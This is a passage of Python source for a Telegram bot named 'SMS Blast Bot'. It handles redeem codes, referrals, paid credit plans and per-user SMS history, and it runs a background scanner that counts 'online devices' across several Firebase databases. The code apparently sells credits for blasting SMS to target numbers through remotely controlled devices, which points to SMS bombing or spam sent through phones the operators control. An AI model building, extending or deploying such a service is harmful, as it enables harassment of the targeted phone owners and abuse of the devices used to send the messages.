async def user_redeem_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    code = msg.text.strip().upper(); await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!",
                          reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Expired!",
                          reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    if uid in cd.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Already used!",
                          reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    credits = cd["credits"]; add_credits(uid, credits, d)
    cd["uses_left"] = cd.get("uses_left", 1) - 1
    cd.setdefault("used_by", []).append(uid); save(d)
    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} Redeem OK!\n💰 +{credits}\n💳 {get_user_credits(uid, d)}",
                     reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    code = generate_user_refer_code(uid, d); save(d)
    rc = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral</b>\n\nHar referral pe <b>{rc}</b> credits!\n\n"
        f"🎁 Code: <code>{code}</code>\n\n🔗 https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    ud = d["users"].get(str(uid), {}); stats = d.get("stats", {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{ud.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{ud.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(ud.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your History</b>\n\n<i>Nothing.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your History</b>\n"]
        for i, e in enumerate(reversed(history), 1):
            st = "✅" if e.get("status") == "sent" else "🛑" if e.get("status") == "stopped" else "⏳"
            lines.append(f"{i}. [{fmt_time(e.get('timestamp', 0))}] {st} <code>{mask_number(e.get('number', '?'))}</code>")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load(); plans = d.get("pricing", {}).get("plans", [])
    if not plans: await cq.answer("❌ No plans!", show_alert=True); return
    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    rows = []
    for p in plans:
        text += f"📋 <b>{p['name']}</b>\n💰 {p['price']} = {p['credits']} credits\n\n"
        rows.append([btn_url(f"Buy {sc(p['name'][:20])}", p['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: {SUPPORT_GROUP_NAME}\n\n"
        f"<i>Credits chahiye toh admin se contact karein.</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "user:support")
async def user_support(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🆘')} <b>Support</b>\n\n"
        f"{em(EMOJI_CROWN, '👤')} Owner: {SUPER_ADMIN_NAME}\n"
        f"{em(EMOJI_BELL, '💬')} Group: {SUPPORT_GROUP_NAME}\n\n"
        f"Koi bhi issue ke liye contact karein.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn_url("ᴏᴡɴᴇʀ ᴄᴏɴᴛᴀᴄᴛ", SUPER_ADMIN_LINK, EMOJI_CROWN, "👤")],
            [btn_url("sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", SUPPORT_GROUP_LINK, EMOJI_BELL, "💬")],
            [btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")]]),
        parse_mode="HTML")

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ═══════════════════════════════════════════════════════════════════
#  SCANNER
# ═══════════════════════════════════════════════════════════════════
async def background_firebase_scanner(bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS
    log.info("Scanner STARTED"); first = False
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5); continue
            SCANNING_IN_PROGRESS = True
        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
        start = time.time()
        try:
            d = load(); fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ᴅʙs"
                CACHED_DEVICES = []
                async with SCAN_LOCK: SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL); continue
            devices = await get_all_online_devices(d)
            dur = time.time() - start
            CACHED_DEVICES = devices
            for fb in fbs:
                on = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
                FB_DEVICE_COUNTS[fb["id"]] = {"label": fb.get("label", fb["url"][:30]),
                                              "online": on, "last_update": int(time.time())}
            LAST_SCAN_TIME = time.time()
            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs"
                log.info(f"[SCAN] {len(devices)} | {len(fbs)} DBs | {dur:.1f}s")
                if not first:
                    try:
                        await bot.send_message(MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>Scanner active!</b>\n"
                            f"📱 Devices: <b>{len(devices)}</b>\n🔥 DBs: <b>{len(fbs)}</b>\n⏱ {dur:.1f}s",
                            parse_mode="HTML")
                    except: pass
                    first = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[SCAN] {e}")
        finally:
            async with SCAN_LOCK: SCANNING_IN_PROGRESS = False
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices(): return CACHED_DEVICES

# ═══════════════════════════════════════════════════════════════════
#  BANNER + HEALTHCHECK + SUPERVISOR
# ═══════════════════════════════════════════════════════════════════
def _print_banner():
    B = "\033[1;36m"; G = "\033[1;32m"; Y = "\033[1;33m"; R = "\033[0m"
    print()
    print(f"{B}╔══════════════════════════════════════════════════════╗{R}")
    print(f"{B}║{R}  {G}🚀  SMS BLAST BOT {_VERSION}{R}")
    print(f"{B}║{R}  {G}●  STATUS: RUNNING{R}")
    print(f"{B}╠══════════════════════════════════════════════════════╣{R}")
    print(f"{B}║{R}  👑  Owner   : {MAIN_OWNER}")
    print(f"{B}║{R}  🛡  Admins  : {len(SUPER_ADMINS)}")
    print(f"{B}║{R}  🔥  Firebase: {len(MY_FIREBASES)} DBs")
    print(f"{B}║{R}  📢  Channels: {len(MY_CHANNELS)}")
    print(f"{B}║{R}  💾  Data    : {_DATA_FILE}")
    print(f"{B}╚══════════════════════════════════════════════════════╝{R}")
    print()

async def health_handler(request):
    return web.json_response({"status": "ok", "bot": "running", "version": _VERSION})

async def run_healthcheck_server():
    port = int(os.getenv("PORT", "8080"))
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/healthz", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Healthcheck server on port {port}")

async def _run_bot_once():
    bot = Bot(token=BOT_TOKEN)
    try:
        info = await bot.get_webhook_info()
        if info.url:
            log.warning(f"[BOOT] Stale webhook: {info.url} — deleting")
            await bot.delete_webhook(drop_pending_updates=True)
            log.info("[BOOT] Webhook deleted.")
        else:
            log.info("[BOOT] No webhook — clean.")
    except Exception as e:
        log.warning(f"[BOOT] delete_webhook: {e}")
        try:
            async with aiohttp.ClientSession() as s:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true"
                async with s.get(url, timeout=10) as r:
                    log.info(f"[BOOT] fallback: {await r.json()}")
        except Exception as e2:
            log.error(f"[BOOT] fallback: {e2}")

    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    @dp.errors()
    async def _on_error(event):
        exc = getattr(event, "exception", None)
        update = getattr(event, "update", None)
        tb_text = "".join(_tb.format_exception(type(exc), exc, exc.__traceback__)) if exc else "unknown"
        ctx = "?"
        try:
            if update and getattr(update, "message", None):
                ctx = f"msg from {update.message.from_user.id}"
            elif update and getattr(update, "callback_query", None):
                ctx = f"cb {update.callback_query.data}"
        except: pass
        header = f"HANDLER {type(exc).__name__ if exc else '?'} ({ctx})"
        log.error(f"[{header}]\n{tb_text}")
        _append_crash_log(header, tb_text)
        try:
            b = getattr(event, "bot", None)
            if b: await _report_crash_to_owner(b, header, tb_text)
        except: pass
        return True

    me = await bot.get_me()
    log.info(f"@{me.username} — Bot {_VERSION} started!")
    print(f"\033[1;32m  ✅  BOT ONLINE — @{me.username}\033[0m\n")

    await get_shared_session()
    scanner_task = asyncio.create_task(background_firebase_scanner(bot))

    try:
        await bot.send_message(MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        scanner_task.cancel()
        try: await scanner_task
        except (asyncio.CancelledError, Exception): pass
        await close_shared_session()
        try: await bot.session.close()
        except: pass

async def _supervisor():
    attempt = 0; healthy = 300.0
    while True:
        attempt += 1; started_at = time.time()
        try:
            log.info(f"[SUPERVISOR] attempt #{attempt}")
            await _run_bot_once()
            log.warning("[SUPERVISOR] start_polling returned — restarting")
            _append_crash_log("SUPERVISOR", "start_polling returned")
        except asyncio.CancelledError:
            log.info("[SUPERVISOR] Cancelled"); raise
        except KeyboardInterrupt:
            log.info("[SUPERVISOR] KeyboardInterrupt"); return
        except Exception as e:
            tb_text = "".join(_tb.format_exception(type(e), e, e.__traceback__))
            header = f"SUPERVISOR {type(e).__name__}"
            log.error(f"[{header}] {e}\n{tb_text}")
            _append_crash_log(header, tb_text)
            try:
                cb = Bot(token=BOT_TOKEN)
                await _report_crash_to_owner(cb, header, tb_text)
                try: await cb.session.close()
                except: pass
            except: pass

        uptime = time.time() - started_at
        if uptime >= healthy: attempt = 0
        delay = min(60, 10 * (2 ** max(0, attempt - 1))) if attempt > 0 else 10
        log.info(f"[SUPERVISOR] Restart in {delay}s")
        await asyncio.sleep(delay)

async def main():
    _print_banner()
    _install_global_excepthook()
    await run_healthcheck_server()
    await _supervisor()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Stopped.")